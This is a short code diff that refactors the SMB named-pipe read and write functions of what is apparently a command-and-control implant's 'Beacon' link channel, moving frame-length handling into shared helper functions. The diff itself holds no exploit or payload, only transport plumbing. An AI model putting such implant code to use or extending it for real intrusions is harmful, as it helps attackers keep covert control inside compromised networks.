@@ -144,43 +144,22 @@ BOOL write_all(HANDLE pipe, char * buffer, int size) {
 /* 
  * Implement our SMB Beacon module.
  */
+static int smb_raw_read(void * ctx, char * buffer, int n) {
+	return read_all((HANDLE)ctx, buffer, n);
+}
+
+static int smb_raw_write(void * ctx, char * buffer, int n) {
+	return write_all((HANDLE)ctx, buffer, n);
+}
+
 int link_channel_smb_read(void * thisp, char * buffer, int max) {
 	LCHANNEL * inst = (LCHANNEL *)thisp;
-	char     * frame;
-	int        flen, rlen, get;
-
-	/* read our length into a pro-forma frame */
-	frame = link_frame_header(SETTING_SMB_FRAME_HEADER, 0, &flen);
-	if (frame == NULL)
-		return -1;
-	rlen  = read_all(inst->pipe, frame, flen);
-	if (rlen == -1 || rlen != flen)
-		return -1;
-
-	/* extract our length value... */
-	memcpy(&get, frame + flen + -4, 4);
-
-	/* sanity check our get value */
-	if (get > max || get < 0)
-		return -1;
-
-	return read_all(inst->pipe, buffer, get);
+	return link_frame_read(SETTING_SMB_FRAME_HEADER, smb_raw_read, (void *)inst->pipe, buffer, max);
 }
 
 int link_channel_smb_write(void * thisp, char * buffer, int length) {
 	LCHANNEL * inst = (LCHANNEL *)thisp;
-	char     * frame;
-	int        flen;
-
-	/* build and write our frame header */
-	frame = link_frame_header(SETTING_SMB_FRAME_HEADER, length, &flen);
-	if (frame == NULL)
-		return FALSE;
-	if (!write_all(inst->pipe, frame, flen))
-		return FALSE;
-
-	/* write the entire package */
-	return write_all(inst->pipe, buffer, length);
+	return link_frame_write(SETTING_SMB_FRAME_HEADER, smb_raw_write, (void *)inst->pipe, buffer, length);
 }
 
 void link_channel_smb_close(void * thisp) {
